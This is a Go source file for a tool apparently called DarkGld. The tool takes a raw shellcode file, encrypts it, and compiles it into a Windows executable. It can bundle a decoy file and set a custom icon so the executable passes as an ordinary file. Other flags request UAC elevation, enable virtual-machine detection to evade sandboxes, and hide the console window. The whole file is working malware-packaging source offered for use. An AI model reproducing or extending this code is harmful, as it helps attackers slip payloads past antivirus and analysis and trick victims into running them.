package main

import (
	"DarkGld/templates"
	"DarkGld/util"
	"crypto/rand"
	"flag"
	"github.com/fatih/color"
	"io/ioutil"
	mrand "math/rand"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"
)



func init() {
	mrand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[mrand.Intn(len(letterRunes))]
	}
	return string(b)
}



var (
	shellcode 		= flag.String("shellcode", "", "shellcode bin file. Example: shellcode.bin")
	arch			= flag.String("arch", "", "target system architecture. x64/x86 , default: x64")
	icon			= flag.String("icon", "", "exe icon file path. ")
	file			= flag.String("file", "", "file loaded into exe")
	uac				= flag.Bool("uac", false, "is UAC permission required")
	protect			= flag.Bool("protect", false, "is Virtual machine detection required")
)

func main() {
	flag.Parse()

	GOFILE := RandStringRunes(6) + ".go"
	OUTFILE := RandStringRunes(6) + ".exe"
	if !util.Exists(*shellcode) {
		color.Red("[x] Shellcode file is not exist.")
		os.Exit(0)
	}
	if !util.Exists(*icon) {
		color.Yellow("[>] Icon file is not exist. The program would not set the icon.")
		*icon = ""
	}

	if strings.EqualFold(*arch, "x86") {
		color.Green("[>] Arch => x86")
		os.Setenv("GOARCH", "386")
	}else {
		color.Green("[>] Arch => x64")
		os.Setenv("GOARCH", "amd64")
	}

	dir := "temp/"
	if util.IsDir(dir) {
		color.Red("[!] Directory:「temp」 is exist. ")
		os.Exit(0)
	}else {
		os.Mkdir(dir, os.ModePerm)
		color.Green("[>] Create a directory: %s", dir)
	}

	raw, err := ioutil.ReadFile(*shellcode)
	if err != nil {
		println("[!] " + err.Error())
		return
	}

	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)
	raw = util.E(raw, key, nonce)

	if util.Exists(*file) {
		color.Green("[>] %s => EXE ", *file)
		OUTFILE = strings.Replace(path.Base(*file), path.Ext(*file), ".exe", -1)
		templates.FileTemplate(dir+GOFILE, key, nonce, raw, *file, *protect)
	}else {
		color.Yellow("[>] Null => EXE")
		templates.NoFileTemplate(dir + GOFILE, key, nonce, raw, *protect)
	}
	manifest := dir + strings.Replace(GOFILE, ".go", ".exe.manifest", -1)
	if *uac {
		templates.UACTemplate(manifest)
	}else {
		templates.NoUACTemplate(manifest)
	}
	syso := dir + strings.Replace(GOFILE, ".go", ".syso", -1)
	color.Green("[>] Compiling %s", syso)
	if strings.Compare(*icon, "") == -1 {
		//rsrc -manifest main.exe.manifest -ico rc.ico -o rsrc.syso
		err = exec.Command("rsrc", "-manifest", manifest, "-o", syso).Run()
		if err != nil {
			println("[!] Compile fail: " + err.Error())
			return
		}
	}else {
		err = exec.Command("rsrc", "-manifest", manifest, "-ico", *icon , "-o", syso).Run()
		if err != nil {
			println("[!] Compile fail: " + err.Error())
			return
		}
	}
	color.Green("[>] Compiling %s", GOFILE)
	os.Setenv("GO111MODULE", "off")
	err = exec.Command("go", "build", "-o", ".\\" + OUTFILE , "-ldflags", "-w -s -H=windowsgui", "-gcflags", "-trimpath=$GOPATH/src", "-asmflags", "-trimpath=$GOPATH/src", ".\\" + dir ).Run()

	if err != nil {
		println("[!] Compile fail: " + err.Error())
		return
	}

	os.RemoveAll(dir)
	color.Green("[>] Delete 「%s」", dir)
}
